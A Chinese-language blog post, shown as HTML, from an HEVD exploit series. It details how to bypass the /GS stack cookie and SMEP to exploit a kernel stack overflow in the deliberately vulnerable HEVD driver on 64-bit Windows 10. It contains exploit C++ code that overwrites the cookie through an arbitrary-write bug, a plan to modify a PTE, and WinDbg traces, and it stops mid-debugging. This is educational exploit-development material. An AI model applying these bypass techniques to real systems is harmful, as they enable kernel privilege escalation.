@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>[HEVD exploit 系列] StackOverflowGS - Logic Security 逻辑门</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="[HEVD exploit 系列] StackOverflowGS" />
+<meta property="og:description" content="0. 前言 HackSys Extreme Vulnerable Driver (HEVD) 是出于学习内核的漏洞利用技巧而开发的具有多个漏洞的 Windows 驱动程序。本文介绍了 Windows 10 64 位环境下如何绕过带有 /GS 保护措施的栈溢出漏洞，涉及 SMEP 和 /GS 两个保护措施。文章中仅贴出部分代码，完整代码见：https://github.com/zoemurmure/HEVD-Exploit
+1. 目标函数 TriggerBufferOverflowStackGS
+__int64 __fastcall TriggerBufferOverflowStackGS(void *src, unsigned __int64 Size) { char dst[512]; // [rsp&#43;20h] [rbp-238h] BYREF memset(dst, 0, sizeof(dst)); ProbeForRead(src, 0x200ui64, 1u); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] UserBuffer: 0x%p\n&#34;, src); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] UserBuffer Size: 0x%X\n&#34;, Size); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] KernelBuffer: 0x%p\n&#34;, dst); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] KernelBuffer Size: 0x%X\n&#34;, 512i64); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] Triggering Buffer Overflow in Stack (GS)\n&#34;); memmove(dst, src, Size); return 0i64; } 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.zoemurmure.top/posts/hevd_stackoberflowgs/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-10T11:18:29+08:00" />
+<meta property="article:modified_time" content="2023-01-10T11:18:29+08:00" />
+
+		<meta itemprop="name" content="[HEVD exploit 系列] StackOverflowGS">
+<meta itemprop="description" content="0. 前言 HackSys Extreme Vulnerable Driver (HEVD) 是出于学习内核的漏洞利用技巧而开发的具有多个漏洞的 Windows 驱动程序。本文介绍了 Windows 10 64 位环境下如何绕过带有 /GS 保护措施的栈溢出漏洞，涉及 SMEP 和 /GS 两个保护措施。文章中仅贴出部分代码，完整代码见：https://github.com/zoemurmure/HEVD-Exploit
+1. 目标函数 TriggerBufferOverflowStackGS
+__int64 __fastcall TriggerBufferOverflowStackGS(void *src, unsigned __int64 Size) { char dst[512]; // [rsp&#43;20h] [rbp-238h] BYREF memset(dst, 0, sizeof(dst)); ProbeForRead(src, 0x200ui64, 1u); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] UserBuffer: 0x%p\n&#34;, src); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] UserBuffer Size: 0x%X\n&#34;, Size); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] KernelBuffer: 0x%p\n&#34;, dst); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] KernelBuffer Size: 0x%X\n&#34;, 512i64); DbgPrintEx(0x4Du, 3u, &#34;[&#43;] Triggering Buffer Overflow in Stack (GS)\n&#34;); memmove(dst, src, Size); return 0i64; } 2."><meta itemprop="datePublished" content="2023-01-10T11:18:29+08:00" />
+<meta itemprop="dateModified" content="2023-01-10T11:18:29+08:00" />
+<meta itemprop="wordCount" content="2013">
+<meta itemprop="keywords" content="HEVD,exploit,binary," />
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CPJWE5ZVG9"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CPJWE5ZVG9', { 'anonymize_ip': false });
+}
+</script>
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Logic Security 逻辑门" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/blog_img.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Logic Security 逻辑门</div>
+					
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/history/">
+				
+				<span class="menu__text">历史文章</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">[HEVD exploit 系列] StackOverflowGS</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">zoemurmure</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2023-01-10T11:18:29&#43;08:00">2023-01-10</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/hevd/" rel="category">HEVD</a>
+	</span>
+</div></div>
+		</header>
+		
+<div class="post__toc toc">
+	<div class="toc__title">Page content</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#0-前言">0. 前言</a></li>
+    <li><a href="#1-目标函数">1. 目标函数</a></li>
+    <li><a href="#2-保护措施gs-protection2">2. 保护措施：/GS protection^[2]^</a>
+      <ul>
+        <li><a href="#21-介绍">2.1 介绍</a></li>
+        <li><a href="#22-绕过方法">2.2 绕过方法</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-保护措施smep">3. 保护措施：SMEP</a>
+      <ul>
+        <li><a href="#31-介绍">3.1 介绍</a></li>
+        <li><a href="#32-绕过方法">3.2 绕过方法</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-实现">4. 实现</a>
+      <ul>
+        <li><a href="#41-需要实现的功能">4.1 需要实现的功能</a></li>
+        <li><a href="#42-整体流程">4.2 整体流程</a></li>
+        <li><a href="#43-gs-绕过-方法">4.3 /GS 绕过 方法</a></li>
+        <li><a href="#44-smep-绕过">4.4 SMEP 绕过</a></li>
+        <li><a href="#45-结果">4.5 结果</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-知识点积累">5. 知识点积累</a></li>
+    <li><a href="#6-参考资料">6. 参考资料</a></li>
+  </ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<h2 id="0-前言">0. 前言</h2>
+<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSys Extreme Vulnerable Driver (HEVD)</a> 是出于学习内核的漏洞利用技巧而开发的具有多个漏洞的 Windows 驱动程序。本文介绍了 Windows 10 64 位环境下如何绕过带有 /GS 保护措施的栈溢出漏洞，涉及 SMEP 和 /GS 两个保护措施。文章中仅贴出部分代码，完整代码见：https://github.com/zoemurmure/HEVD-Exploit</p>
+<h2 id="1-目标函数">1. 目标函数</h2>
+<p>TriggerBufferOverflowStackGS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">TriggerBufferOverflowStackGS</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>src, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> Size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> dst[<span style="color:#ae81ff">512</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-238h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(dst, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(dst));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ProbeForRead</span>(src, <span style="color:#ae81ff">0x200u</span>i64, <span style="color:#ae81ff">1u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] UserBuffer: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, src);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] UserBuffer Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] KernelBuffer: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dst);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] KernelBuffer Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">512</span>i64);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DbgPrintEx</span>(<span style="color:#ae81ff">0x4Du</span>, <span style="color:#ae81ff">3u</span>, <span style="color:#e6db74">&#34;[+] Triggering Buffer Overflow in Stack (GS)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memmove</span>(dst, src, Size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>i64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="2-保护措施gs-protection2">2. 保护措施：/GS protection^[2]^</h2>
+<h3 id="21-介绍">2.1 介绍</h3>
+<p>F5 生成的伪代码和 StackOverflow 相同，但直接从汇编代码看，可以看到函数的开头和结尾多了两端代码：</p>
+<pre tabindex="0"><code>PAGE:00000001400866E0 48 89 5C 24 18                mov     [rsp+arg_10], rbx
+PAGE:00000001400866E5 56                            push    rsi
+PAGE:00000001400866E6 57                            push    rdi
+PAGE:00000001400866E7 41 54                         push    r12
+PAGE:00000001400866E9 41 56                         push    r14
+PAGE:00000001400866EB 41 57                         push    r15
+PAGE:00000001400866ED 48 81 EC 30 02 00 00          sub     rsp, 230h
+PAGE:00000001400866F4 48 8B 05 05 C9 F7 FF          mov     rax, cs:__security_cookie
+PAGE:00000001400866FB 48 33 C4                      xor     rax, rsp
+PAGE:00000001400866FE 48 89 84 24 20 02 00 00       mov     [rsp+258h+var_38], rax
+
+
+PAGE:00000001400867D6
+PAGE:00000001400867D6                               loc_1400867D6:
+PAGE:00000001400867D6 8B C3                         mov     eax, ebx
+PAGE:00000001400867D8 48 8B 8C 24 20 02 00 00       mov     rcx, [rsp+258h+var_38]
+PAGE:00000001400867E0 48 33 CC                      xor     rcx, rsp        ; StackCookie
+PAGE:00000001400867E3 E8 28 A9 F7 FF                call    __security_check_cookie
+PAGE:00000001400867E8 48 8B 9C 24 70 02 00 00       mov     rbx, [rsp+258h+arg_10]
+PAGE:00000001400867F0 48 81 C4 30 02 00 00          add     rsp, 230h
+PAGE:00000001400867F7 41 5F                         pop     r15
+PAGE:00000001400867F9 41 5E                         pop     r14
+PAGE:00000001400867FB 41 5C                         pop     r12
+PAGE:00000001400867FD 5F                            pop     rdi
+PAGE:00000001400867FE 5E                            pop     rsi
+PAGE:00000001400867FF C3                            retn
+</code></pre><p>系统使用全局 securit_cookie 对 rsp 的数值进行异或并保存在了栈中，栈中数值的大致位置如下：</p>
+<pre tabindex="0"><code>+-+-+-+-+-+-+-+-+-+-+-+-+
+|       variables       |
++-+-+-+-+-+-+-+-+-+-+-+-+
+| xored security_cookie |
++-+-+-+-+-+-+-+-+-+-+-+-+
+|    saved registers    |
++-+-+-+-+-+-+-+-+-+-+-+-+
+|    return address     |
++-+-+-+-+-+-+-+-+-+-+-+-+
+| function&#39;s arguments  |
++-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre><p>因此如果想要通过栈溢出的方式修改返回地址的数值，保存的 xored security_cookie 会首先被修改，导致无法通过 <code>__security_check_cookie</code> 的检查。而 security_cookie 的数值会在每次使用时随机生成，如果随机算法没有问题，攻击者就没有办法预测出该数值，无法再通过之前的方法对栈溢出漏洞进行攻击。</p>
+<p><code>__security_check_cookie</code> 的检查会检查两个部分，首先是 xored security_cookie 再次和 RSP 异或之后是否和最初的 security_cookie 一致，其次是该数值的高16位是否是 0：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">_security_check_cookie</span>(uintptr_t StackCookie)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rcx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( StackCookie <span style="color:#f92672">!=</span> _security_cookie )
+</span></span><span style="display:flex;"><span>ReportFailure:
+</span></span><span style="display:flex;"><span>    _report_gsfailure(StackCookie);
+</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> __ROL8__(StackCookie, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (_WORD)v1 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    StackCookie <span style="color:#f92672">=</span> __ROR8__(v1, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> ReportFailure;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>通过在 IDA 中查找，发现 security_cookie 由函数 <code>_security_init_cookie</code> 生成，并最终保存在 .data 段的起始位置。</p>
+<pre tabindex="0"><code>.data:0000000140003000   ; Segment permissions: Read/Write
+.data:0000000140003000   _data           segment para public &#39;DATA&#39; use64
+.data:0000000140003000                   assume cs:_data
+.data:0000000140003000                   ;org 140003000h
+.data:0000000140003000   ; uintptr_t _security_cookie
+.data:0000000140003000   __security_cookie dq 2B992DDFA232h      ; DATA XREF: __security_check_cookie↑r
+</code></pre><h3 id="22-绕过方法">2.2 绕过方法</h3>
+<ol>
+<li>
+<p>SEH
+在之前学习的普通程序栈溢出利用方法中，提到过利用 SEH 实现漏洞利用，通过修改 SEH 中的 exception handler 地址并触发异常来控制程序的执行流程。但是这个方法在这里并不可行，因为这次的测试环境是 64 位系统，而只有 32 位系统的 SEH 信息保存在栈中，64 位系统的 SEH 信息保存在一个表中，表的地址保存在 PE 头^[3]^。因此无法使用 SEH 进行漏洞利用。</p>
+</li>
+<li>
+<p>security_cookie 数值猜测
+我决定不在 Windows 10 上浪费这个时间了。</p>
+</li>
+<li>
+<p>修改 .data 和 栈上存储的 cookie 值
+要做到这点，需要找到一个任意写漏洞，而 HEVD 显然是有这个漏洞的，就在 <code>TriggerArbitraryWrite</code> 函数中。除此之外，此次漏洞函数中还额外对 security_cookie 进行了一次栈顶的异或操作，因此还要获取栈顶的数值，和下面的方法 5 类似。</p>
+</li>
+<li>
+<p>覆盖虚函数指针
+条件：①函数参数中有对象或结构体的指针；②参数是放在栈上的。由于测试环境是 64 位系统，参数保存在寄存器中，因此不考虑。</p>
+</li>
+<li>
+<p>读取 cookie 数值并计算出 xored security_cookie 数值
+需要一个任意读漏洞读取 cookie 的数值，以及想办法获取计算 xored security_cookie 时 RSP 寄存器的数值。文章^[1]^使用了这个方法，并且用了一个限制条件很严格的方法获取到了 RSP 寄存器的数值。</p>
+</li>
+</ol>
+<p>此次学习过程会尝试使用方法 3/5 实现漏洞利用，方法 5 在文章^[1]^中实现时使用了 HEVD 的任意写漏洞实现任意读来读取 cookie 数值，这里在实现时直接按照方法 3，利用任意写漏洞修改 .data 段的 cookie 数值，之后获取 RSP 数值的方法参照文章^[1]^实现，但是<strong>进行了一些修改</strong>，修改原因见下面的详细分析。目前还没有找到其他在 X64 系统上绕过 /GS 的方法，如果有资料的话欢迎联系我。</p>
+<h2 id="3-保护措施smep">3. 保护措施：SMEP</h2>
+<h3 id="31-介绍">3.1 介绍</h3>
+<p>见 <a href="https://mp.weixin.qq.com/s/F9Na71MkWxM-aGcTkj0I3A">https://mp.weixin.qq.com/s/F9Na71MkWxM-aGcTkj0I3A</a></p>
+<h3 id="32-绕过方法">3.2 绕过方法</h3>
+<p>如果系统开启了 Hyper-V，Virtualization-Based Security(VBS) 中的 Hyper Guard 功能会阻止对于 CR4 寄存器的修改^[5]^，导致修改 CR4 寄存器的方法无法实现漏洞利用。
+文章^[1]^使用了一个新的绕过方法，修改 shellcode 所在页的 PTE 结构^[7]^中的 U/S 字段，将其设置为 Supervisor 状态，这样 SMEP 的保护就不会生效。</p>
+<h2 id="4-实现">4. 实现</h2>
+<h3 id="41-需要实现的功能">4.1 需要实现的功能</h3>
+<ol>
+<li>修改 HEVD.SYS .data 段中保存的 security_cookie 数值；</li>
+<li>修改 shellcode 所在页 PTE 中的 U/S 字段数值；</li>
+<li>获取漏洞发生时的栈顶数值</li>
+</ol>
+<h3 id="42-整体流程">4.2 整体流程</h3>
+<p>获取 HEVD.sys 的基地址 → 获取 HEVD.sys 的 .data 段地址 → 修改 .data 段的 cookie 值 →
+为 shellcode 分配空间 → 获取空间所在页 PTE 地址 → 修改 PTE 的 U/S 字段 → 清空 TLB 缓存
+内核栈空间地址泄露 → 设置栈空间锚点 → 搜索锚点 → RSP 计算
+覆盖栈溢出缓冲区</p>
+<h3 id="43-gs-绕过-方法">4.3 /GS 绕过 方法</h3>
+<h4 id="431-修改-data-段-cookie-数值">4.3.1 修改 .data 段 cookie 数值</h4>
+<p>这部分比较简单，代码如下，完整代码见github：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>ULONGLONG <span style="color:#a6e22e">ChangeCookie</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	通过重写 .data 段中的 cookie 值来绕过 /GS 防御机制。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	返回值是覆盖后的 cookie 值，方便在溢出时进行插入，并与其他绕过方法兼容。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	*/</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 获得 HEVD 基址
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ULONGLONG hevdBaseAddr <span style="color:#f92672">=</span> GetDriverBase(<span style="color:#e6db74">&#34;HEVD.sys&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hevdBaseAddr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[-] Fatal: Error getting base address of HEVD.sys</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 获得 .data 段基址
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ULONGLONG dataBase <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, dataSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	GetSectionAddr(hevdBaseAddr, <span style="color:#e6db74">&#34;.data&#34;</span>, <span style="color:#f92672">&amp;</span>dataBase, <span style="color:#f92672">&amp;</span>dataSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//DWORD hevdDataSecOffset = GetDataSectionOffset(hevdFilePath);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (dataBase <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[-] Fatal: Error getting data section offset</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//ULONGLONG hevdDataSection = hevdBaseAddr + hevdDataSecOffset;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	printf(<span style="color:#e6db74">&#34;[+] hevdDataSection is 0x%I64x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dataBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 修改 .data 段的 cookie 值
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ULONGLONG newCookie <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000414141414141</span>;
+</span></span><span style="display:flex;"><span>	BOOL status <span style="color:#f92672">=</span> WriteData(dataBase, newCookie);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> FALSE) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[-] FATAL writing newCookie at hevd data section</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> newCookie;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="432-获取栈顶数值">4.3.2 获取栈顶数值</h4>
+<p>首先利用 <code>NtQuerySystemInformation</code> 函数获取当前进程的 <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code> 信息，该信息中包含了进程中每个线程的 StackBase 和 StackLimit 信息，StackBase 表示栈的起始地址，StackLimit 表示栈范围内可分配的最小地址，由于栈空间是向下分配的，因此 StackBase 的数值大于 StackLimit 的数值。该方法代码基本来自参考链接[8]所在项目和参考链接[1]，存在细节的修改。</p>
+<p>代码执行后得到StackBase = 0xffffed0993bb2000，StackLimit = 0xffffed0993bac000。</p>
+<p>确定栈范围之后，需要在该范围内找到一个不变的常量作为锚点，然后以此锚点的地址为基址，确定发生异或时和栈顶之间的偏移。在参考链接[1]中，使用的锚点是 IOCTL_CODE，可以看一下系统执行到时 <code>HEVD!TriggerBufferOverflowStackGS</code> 时栈上的数据分布：</p>
+<pre tabindex="0"><code>ffffed09`93bb1798 fffff800746866da HEVD!BufferOverflowStackGSIoctlHandler+0x1a 
+ffffed09`93bb17a0 0000000000000010 
+ffffed09`93bb17a8 0000000000050282 
+ffffed09`93bb17b0 ffffed0993bb17c8 
+ffffed09`93bb17b8 0000000000000018 
+ffffed09`93bb17c0 0000000000000000 
+ffffed09`93bb17c8 fffff80074685223 HEVD!IrpDeviceIoCtlHandler+0x1ab 
+ffffed09`93bb17d0 ffffbc24a1f15c89 
+ffffed09`93bb17d8 0000000000000000 
+ffffed09`93bb17e0 fffff80074688300 HEVD! ?? ::NNGAKEGL::`string&#39;
+ffffed09`93bb17e8 0000000000222007 
+ffffed09`93bb17f0 ffff880648758680 
+ffffed09`93bb17f8 fffff800724316b5 nt!IofCallDriver+0x55
+</code></pre><p>IOCTL_CODE <code>0000000000222007</code> 确实位于栈上，而且这个数据是在执行 <code>HEVD!IrpDeviceIoCtlHandler</code> 的时候被放到栈上的，经过调试发现，该数值之所以出现在栈上，是因为在 <code>HEVD!IrpDeviceIoCtlHandler</code> 函数中调用 <code>DbgPrintEx</code> 函数的时候对上下文进行保存，对保存了 IOCTL_CODE 的寄存器也进行了保存。</p>
+<p>当然实际用于锚点的并不是 <code>0000000000222007</code>，而是 <code>000000000022200B</code>，这是任意写漏洞所在函数的 IOCTL_CODE，因为在搜索栈数据时，栈溢出漏洞所在函数并没有被调用，所以它的控制码是不会出现在栈上的，而为了搜索栈，需要调用任意写漏洞所在函数，所以它的控制码会出现在栈中，同时由于：</p>
+<ul>
+<li>只有我们的漏洞利用程序在使用 HEVD.sys 这个驱动，每次只触发其中的一个 handler；</li>
+<li>不同 handler 的调用结构相似，都会在之前调用 <code>DbgPrintEx</code>。</li>
+</ul>
+<p>所以每次触发不同 handler 之后栈中数据分布相同，而且都存在对应 handler 的 IOCTL_CODE。</p>
+<p>但是我发现上面的条件实在是有些严苛，尤其是第二点，实际环境中无法保证 IOCTL_CODE 一定会被压入栈中，因此我考虑使用一个更常见的锚点——返回地址。</p>
+<p>通过查看函数调用栈可以发现，每次触发驱动的 handler 函数时，一定会调用 <code>nt!NtDeviceIoControlFile</code> 函数，并且返回地址在 <code>nt!NtDeviceIoControlFile+0x56</code>。</p>
+<blockquote>
+<p>Q: 为什么没有选择距离更近的 <code>nt!IofCallDriver</code> 函数？
+A: 因为需要在函数机器码中搜索 call 指令来确定返回地址（没有直接使用偏移量0x56），在 <code>nt!IofCallDriver</code> 中，call 指令机器码 0xE8 之前还存在其他 0xE8，搜索不方便，因此选择 <code>nt!NtDeviceIoControlFile</code> 函数。</p>
+</blockquote>
+<p>这个返回地址可以在 exploit 中通过代码获得，同时我想即便在实际的漏洞环境中，通过增加执行次数、寻找时机等方式也能够实现类似条件一的环境，因此使用返回地址作为锚点的方式通用性会好一些。</p>
+<p>首先验证此方法的可行性：</p>
+<pre tabindex="0"><code>1: kd&gt; g
+Breakpoint 0 hit
+HEVD!TriggerArbitraryWrite:
+fffff800`74685e74 488bc4          mov     rax,rsp
+0: kd&gt; kb
+ # RetAddr               : Args to Child                                                           : Call Site
+00 fffff800`74685e6f     : ffffed09`92d337e8 00000000`00000001 00000000`00000000 fffff800`7280a621 : HEVD!TriggerArbitraryWrite 
+01 fffff800`746851f3     : ffffbc24`a0997c89 00000000`00000000 fffff800`74688340 00000000`0022200b : HEVD!ArbitraryWriteIoctlHandler+0x17
+02 fffff800`724316b5     : ffff8806`4609f780 00000000`00000002 00000000`00000001 ffff8806`469af190 : HEVD!IrpDeviceIoCtlHandler+0x17b
+03 fffff800`7281d4c8     : ffffed09`92d33b80 ffff8806`4609f780 00000000`00000001 ffff8806`00000000 : nt!IofCallDriver+0x55
+04 fffff800`7281d2c7     : ffff8806`00000000 ffffed09`92d33b80 00000000`00000000 ffffed09`92d33b80 : nt!IopSynchronousServiceTail+0x1a8
+05 fffff800`7281c646     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : nt!IopXxxControlFile+0xc67
+06 fffff800`72611ab5     : 00000000`000000a4 00000000`00000000 00000000`00000000 00000000`00000000 : nt!NtDeviceIoControlFile+0x56
+07 00007ffb`0196d1a4     : 00007ffa`ff01572b 00000000`00000000 00002032`98fecb16 00000000`00000000 : nt!KiSystemServiceCopyEnd+0x25
+08 00007ffa`ff01572b     : 00000000`00000000 00002032`98fecb16 00000000`00000000 00007ffb`018e6777 : 0x00007ffb`0196d1a4
+09 00000000`00000000     : 00002032`98fecb16 00000000`00000000 00007ffb`018e6777 0000005c`ec6ff450 : 0x00007ffa`ff01572b
+0: kd&gt; s rsp L1000 46 c6 81 72 00 f8 ff ff
